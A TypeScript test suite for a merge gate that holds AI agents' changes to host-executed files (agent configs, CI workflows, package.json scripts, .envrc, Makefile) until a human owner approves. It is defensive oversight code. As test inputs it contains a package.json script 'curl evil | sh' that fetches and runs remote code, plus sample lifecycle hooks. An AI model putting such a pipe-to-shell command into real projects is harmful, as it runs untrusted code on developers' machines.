import { afterEach, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { openProjectDb, type ProjectDbHandle } from "@mfw/db/client";
import { EventBus } from "@mfw/db/eventlog";
import { ulid } from "@mfw/db/ids";
import { brainActions, mergeJobs, runs } from "@mfw/db/schema";
import { eq } from "drizzle-orm";
import { PROVIDER_CATALOGUE } from "../src/agents/catalogue.ts";
import {
	HARNESS_CONFIG_PATHS,
	isHostExecutedPath,
} from "../src/brain-runtime/decision-rights.ts";
import { git, gitOk } from "../src/git.ts";
import { InboxService } from "../src/inbox.ts";
import { silentLogger } from "../src/log.ts";
import {
	applyHostMergeDecision,
	HOST_MERGE_TOOL,
	hostExecutedChange,
} from "../src/merge-gate.ts";
import { type MergeJobView, MergeQueue } from "../src/merge-queue.ts";
import { MFW_EXCLUDE, makeTasks } from "./fixtures/board.ts";

interface Gate {
	root: string;
	handle: ProjectDbHandle;
	queue: MergeQueue;
	merged: string[];
	parked: MergeJobView[];
	bare: string;
	branchRun(name: string, files: Record<string, string>): Promise<string>;
	enqueue(runId: string, branch: string): Promise<void>;
	card(): Promise<typeof brainActions.$inferSelect | undefined>;
	decide(actionId: string, approved: boolean): Promise<boolean>;
	state(runId: string): Promise<string | undefined>;
	tip(): Promise<string>;
	remoteTip(): Promise<string>;
}

const open: Gate[] = [];

async function gate(): Promise<Gate> {
	const root = await mkdtemp(join(tmpdir(), "mfw-host-gate-"));
	const bare = `${root}-remote.git`;
	await git(["init", "-q", "--bare", "-b", "main", bare], tmpdir());
	await git(["init", "-q", "-b", "main"], root);
	await git(["config", "user.email", "t@t"], root);
	await git(["config", "user.name", "t"], root);
	await writeFile(join(root, "base.txt"), "base\n");
	await git(["add", "-A"], root);
	await git(["commit", "-q", "-m", "init"], root);
	await git(["remote", "add", "origin", bare], root);
	await git(["push", "-q", "origin", "main"], root);
	await writeFile(join(root, ".git/info/exclude"), MFW_EXCLUDE);
	const handle = await openProjectDb(join(root, ".mfw"));
	const merged: string[] = [];
	const parked: MergeJobView[] = [];
	const queue = new MergeQueue({
		handle,
		bus: new EventBus(),
		projectRoot: root,
		log: silentLogger(),
		reverify: async () => ({ passed: true }),
		onMerged: async (_job, sha) => {
			merged.push(sha);
		},
		onParked: async (job) => {
			parked.push(job);
		},
		push: { enabled: true, remote: "origin", url: bare, allowLocalUrl: true },
		landingRoot: join(root, ".git", "mfw-landing"),
	});
	const g: Gate = {
		root,
		handle,
		queue,
		merged,
		parked,
		bare,
		branchRun: async (name, files) => {
			const wt = join(root, "worktrees", name);
			await git(["worktree", "add", "-q", "-b", name, wt, "main"], root);
			for (const [file, content] of Object.entries(files)) {
				await mkdir(dirname(join(wt, file)), { recursive: true });
				await writeFile(join(wt, file), content);
			}
			await git(["add", "-A", "-f"], wt);
			await git(["commit", "-q", "-m", `work on ${name}`], wt);
			const runId = ulid();
			await handle.db.insert(runs).values({
				id: runId,
				kind: "task",
				label: name,
				model: "sonnet",
				cwd: wt,
				worktreePath: wt,
				branch: name,
				integrationBranch: "main",
				startedAt: new Date(),
			});
			return runId;
		},
		enqueue: (runId, branch) =>
			queue.enqueue({ runId, taskId: "T-1", branch, targetBranch: "main" }),
		card: async () =>
			(
				await handle.db
					.select()
					.from(brainActions)
					.where(eq(brainActions.status, "held"))
			)[0],
		decide: (actionId, approved) =>
			handle.withTx(async (tx) => {
				const [row] = await tx
					.select()
					.from(brainActions)
					.where(eq(brainActions.id, actionId));
				if (row?.status !== "held") return false;
				await tx
					.update(brainActions)
					.set({ status: approved ? "applied" : "rejected" })
					.where(eq(brainActions.id, actionId));
				await applyHostMergeDecision(tx, row, approved, "test");
				return true;
			}),
		state: async (runId) =>
			(
				await handle.db
					.select({ state: mergeJobs.state })
					.from(mergeJobs)
					.where(eq(mergeJobs.runId, runId))
			)[0]?.state,
		tip: () => gitOk(["rev-parse", "refs/heads/main"], root),
		remoteTip: () => gitOk(["rev-parse", "refs/heads/main"], bare),
	};
	open.push(g);
	return g;
}

afterEach(async () => {
	for (const g of open.splice(0)) {
		g.handle.close();
		await rm(g.root, { recursive: true, force: true });
		await rm(g.bare, { recursive: true, force: true });
	}
});

describe("a merge of host-executed files waits for the owner", () => {
	test("an ordinary finished run is held: no ref move, no push, one card", async () => {
		const g = await gate();
		const before = await g.tip();
		const remote = await g.remoteTip();
		const runId = await g.branchRun("mfw/a", {
			".claude/settings.json": "{}\n",
		});
		await g.enqueue(runId, "mfw/a");

		expect(await g.queue.tick()).toBe("held");
		expect(await g.tip()).toBe(before);
		expect(await g.remoteTip()).toBe(remote);
		expect(g.merged).toEqual([]);
		expect(await g.state(runId)).toBe("held");
		const card = await g.card();
		expect(card?.tool).toBe(HOST_MERGE_TOOL);
		expect((card?.args as { paths: string[] }).paths).toEqual([
			".claude/settings.json",
		]);
		// Nothing further happens until the owner answers.
		expect(await g.queue.tick()).toBe("idle");
		expect(await g.queue.retryParked()).toBe(0);
		expect(await g.tip()).toBe(before);
	});

	test("approval lands and pushes it exactly once", async () => {
		const g = await gate();
		const runId = await g.branchRun("mfw/a", { ".envrc": "use flake\n" });
		await g.enqueue(runId, "mfw/a");
		await g.queue.tick();
		const card = await g.card();
		expect(await g.decide(card?.id as string, true)).toBe(true);
		expect(await g.decide(card?.id as string, true)).toBe(false);

		expect(await g.queue.tick()).toBe("merged");
		expect(await g.queue.tick()).toBe("idle");
		expect(g.merged).toHaveLength(1);
		expect(await g.state(runId)).toBe("merged");
		expect(await g.remoteTip()).toBe(await g.tip());
	});

	test("an approval does not carry over to different content", async () => {
		const g = await gate();
		const runId = await g.branchRun("mfw/a", { "flake.nix": "{ }\n" });
		await g.enqueue(runId, "mfw/a");
		await g.queue.tick();
		const first = await g.card();
		await g.decide(first?.id as string, true);
		// The branch moves after the owner said yes.
		const wt = join(g.root, "worktrees", "mfw/a");
		await writeFile(join(wt, "flake.nix"), "{ evil = true; }\n");
		await git(["add", "-A"], wt);
		await git(["commit", "-q", "-m", "swap"], wt);
		const before = await g.tip();

		expect(await g.queue.tick()).toBe("held");
		expect(await g.tip()).toBe(before);
		const second = await g.card();
		expect(second?.id).not.toBe(first?.id);
	});

	test("the rebase path is gated on the commit it would land", async () => {
		const g = await gate();
		// Merging conflicts (A to "target" here, A to "branch" there), while a
		// rebase drops the shared first commit and applies the second cleanly.
		const runId = await g.branchRun("mfw/r", { "base.txt": "target\n" });
		const wt = join(g.root, "worktrees", "mfw/r");
		await writeFile(join(wt, "base.txt"), "branch\n");
		await writeFile(
			join(wt, "package.json"),
			'{"scripts":{"postinstall":"x"}}\n',
		);
		await git(["add", "-A"], wt);
		await git(["commit", "-q", "-m", "second"], wt);
		await writeFile(join(g.root, "base.txt"), "target\n");
		await git(["add", "-A"], g.root);
		await git(["commit", "-q", "-m", "target moves"], g.root);
		const before = await g.tip();
		await g.enqueue(runId, "mfw/r");

		expect(await g.queue.tick()).toBe("held");
		expect(await g.tip()).toBe(before);
		expect(g.merged).toEqual([]);
		// It really took the rebase path: the branch now sits on the target.
		expect(
			(await git(["merge-base", "--is-ancestor", before, "mfw/r"], g.root))
				.exitCode,
		).toBe(0);
	});

	test("a declined merge never lands and hands the task back", async () => {
		const g = await gate();
		const before = await g.tip();
		const runId = await g.branchRun("mfw/d", { Makefile: "all:\n\ttrue\n" });
		await g.enqueue(runId, "mfw/d");
		await g.queue.tick();
		const card = await g.card();
		await g.decide(card?.id as string, false);
		await g.queue.settleDeclinedHostMerge(card?.id as string);

		expect(await g.state(runId)).toBe("parked");
		expect(g.parked).toHaveLength(1);
		expect(await g.queue.retryParked()).toBe(0);
		expect(await g.queue.tick()).toBe("idle");
		expect(await g.tip()).toBe(before);
	});

	test("ordinary files merge without a card", async () => {
		const g = await gate();
		const runId = await g.branchRun("mfw/o", { "src/a.ts": "export {};\n" });
		await g.enqueue(runId, "mfw/o");
		expect(await g.queue.tick()).toBe("merged");
		expect(await g.card()).toBeUndefined();
	});

	test("a symlink cannot smuggle a protected path past the list", async () => {
		const g = await gate();
		const wtName = "mfw/s";
		const runId = await g.branchRun(wtName, { "cfg/settings.json": "{}\n" });
		const wt = join(g.root, "worktrees", wtName);
		await symlink("cfg", join(wt, ".claude"));
		await git(["add", "-A", "-f"], wt);
		await git(["commit", "-q", "-m", "link"], wt);
		await g.enqueue(runId, wtName);
		expect(await g.queue.tick()).toBe("held");
	});

	test("a change behind a protected symlink counts as that path", async () => {
		const g = await gate();
		await mkdir(join(g.root, "cfg"));
		await writeFile(join(g.root, "cfg/env.sh"), "safe\n");
		await symlink("cfg/env.sh", join(g.root, ".envrc"));
		await git(["add", "-A", "-f"], g.root);
		await git(["commit", "-q", "-m", "linked envrc"], g.root);
		const from = await g.tip();
		const wt = join(g.root, "worktrees", "mfw/t");
		await git(["worktree", "add", "-q", "-b", "mfw/t", wt, "main"], g.root);
		await writeFile(join(wt, "cfg/env.sh"), "evil\n");
		await git(["add", "-A"], wt);
		await git(["commit", "-q", "-m", "edit target"], wt);
		const to = await gitOk(["rev-parse", "mfw/t"], g.root);
		const change = await hostExecutedChange(g.root, from, to);
		expect(change?.paths).toEqual(["cfg/env.sh"]);
	});
});

describe("package.json asks only when what it executes changes", () => {
	const BASE = {
		name: "p",
		version: "1.0.0",
		scripts: { test: "bun test" },
		dependencies: { a: "1.0.0" },
	};

	async function withManifest(g: Gate): Promise<void> {
		await writeFile(join(g.root, "package.json"), JSON.stringify(BASE));
		await git(["add", "-A"], g.root);
		await git(["commit", "-q", "-m", "manifest"], g.root);
	}

	const inboxItems = async (g: Gate) =>
		new InboxService({
			handle: g.handle,
			project: "p",
			tasks: await makeTasks(g.handle, new EventBus(), join(g.root, ".mfw")),
		}).list();

	test.each([
		["a dependency version", { dependencies: { a: "2.0.0" } }],
		["a new dependency", { dependencies: { a: "1.0.0", b: "1.0.0" } }],
		["the package version", { version: "1.0.1" }],
	])("%s lands without a card, with a notify-after item", async (_n, patch) => {
		const g = await gate();
		await withManifest(g);
		const runId = await g.branchRun("mfw/dep", {
			"package.json": JSON.stringify({ ...BASE, ...patch }),
		});
		await g.enqueue(runId, "mfw/dep");
		expect(await g.queue.tick()).toBe("merged");
		expect(await g.card()).toBeUndefined();
		const item = (await inboxItems(g)).find(
			(i) => i.kind === "dependency_change",
		);
		expect(item?.attention).toBe("know");
		expect(item?.detail).toContain("package.json");
	});

	test.each([
		["scripts", { scripts: { test: "curl evil | sh" } }],
		["a lifecycle script", { scripts: { test: "bun test", postinstall: "x" } }],
		["bin", { bin: { tool: "./x.js" } }],
		["workspaces", { workspaces: ["evil/*"] }],
		["a top-level preinstall", { preinstall: "x" }],
		["a top-level install", { install: "x" }],
		["a top-level postinstall", { postinstall: "x" }],
		["a top-level prepare", { prepare: "x" }],
		["trustedDependencies", { trustedDependencies: ["a"] }],
	])("%s is held", async (_n, patch) => {
		const g = await gate();
		await withManifest(g);
		const runId = await g.branchRun("mfw/exec", {
			"package.json": JSON.stringify({ ...BASE, ...patch }),
		});
		await g.enqueue(runId, "mfw/exec");
		expect(await g.queue.tick()).toBe("held");
	});

	test("a manifest that cannot be parsed is held", async () => {
		const g = await gate();
		await withManifest(g);
		const runId = await g.branchRun("mfw/bad", { "package.json": "{ nope" });
		await g.enqueue(runId, "mfw/bad");
		expect(await g.queue.tick()).toBe("held");
	});

	test("a new manifest with scripts is held, one without is not", async () => {
		const held = await gate();
		const a = await held.branchRun("mfw/n1", {
			"pkg/package.json": JSON.stringify({ scripts: { x: "y" } }),
		});
		await held.enqueue(a, "mfw/n1");
		expect(await held.queue.tick()).toBe("held");
		const clean = await gate();
		const b = await clean.branchRun("mfw/n2", {
			"pkg/package.json": JSON.stringify({ name: "x" }),
		});
		await clean.enqueue(b, "mfw/n2");
		expect(await clean.queue.tick()).toBe("merged");
	});

	test("reordering keys is not a change to scripts", async () => {
		const g = await gate();
		await writeFile(
			join(g.root, "package.json"),
			JSON.stringify({ scripts: { a: "1", b: "2" } }),
		);
		await git(["add", "-A"], g.root);
		await git(["commit", "-q", "-m", "manifest"], g.root);
		const runId = await g.branchRun("mfw/order", {
			"package.json": JSON.stringify({ scripts: { b: "2", a: "1" } }),
		});
		await g.enqueue(runId, "mfw/order");
		expect(await g.queue.tick()).toBe("merged");
	});

	test.each([
		"bun.lock",
		"flake.lock",
		"yarn.lock",
	])("a %s-only change lands with a notify-after item", async (lock) => {
		const g = await gate();
		const runId = await g.branchRun("mfw/lock", { [lock]: "locked\n" });
		await g.enqueue(runId, "mfw/lock");
		expect(await g.queue.tick()).toBe("merged");
		expect(await g.card()).toBeUndefined();
		expect(
			(await inboxItems(g)).find((i) => i.kind === "dependency_change")?.detail,
		).toContain(lock);
	});

	test("a symlinked manifest is still held", async () => {
		const g = await gate();
		const runId = await g.branchRun("mfw/link", { "real.json": "{}" });
		const wt = join(g.root, "worktrees", "mfw/link");
		await symlink("real.json", join(wt, "package.json"));
		await git(["add", "-A", "-f"], wt);
		await git(["commit", "-q", "-m", "link"], wt);
		await g.enqueue(runId, "mfw/link");
		expect(await g.queue.tick()).toBe("held");
	});
});

describe("the host-executed list covers what mfw launches or loads", () => {
	test("every catalogue harness declares its config paths, all protected", () => {
		for (const entry of PROVIDER_CATALOGUE) {
			const paths = HARNESS_CONFIG_PATHS[entry.id];
			expect(paths, `${entry.id} declares no config paths`).toBeDefined();
			expect(paths?.length ?? 0).toBeGreaterThan(0);
			for (const p of paths ?? []) {
				expect(isHostExecutedPath(p), `${entry.id}: ${p}`).toBe(true);
			}
		}
	});

	test.each([
		".mcp.json",
		".gemini/settings.json",
		"GEMINI.md",
		".cursor/mcp.json",
		"opencode.json",
		".opencode/plugin.ts",
		".pi/mcp.json",
		"bunfig.toml",
		"flake.nix",
		".envrc",
		".gitattributes",
		".gitmodules",
		"Makefile",
		".husky/pre-commit",
		".githooks/pre-push",
		".npmrc",
		".yarnrc.yml",
		".github/workflows/ci.yml",
		".github/actions/x/action.yml",
		".gitlab-ci.yml",
		".pre-commit-config.yaml",
		"lefthook.yml",
		".claude/settings.json",
		".codex/config.toml",
		"AGENTS.md",
		"CLAUDE.md",
		// The directory itself, as a symlink entry.
		".claude",
		".github/workflows",
	])("%s is protected", (path) => {
		expect(isHostExecutedPath(path)).toBe(true);
	});

	test.each([
		"src/a.ts",
		"docs/guide.md",
		"README.md",
		"src/makefile.ts",
		// Judged by content (package.json) or notify-after (lockfiles).
		"package.json",
		"packages/x/package.json",
		"bun.lock",
		"flake.lock",
		"yarn.lock",
	])("%s is not", (path) => {
		expect(isHostExecutedPath(path)).toBe(false);
	});
});
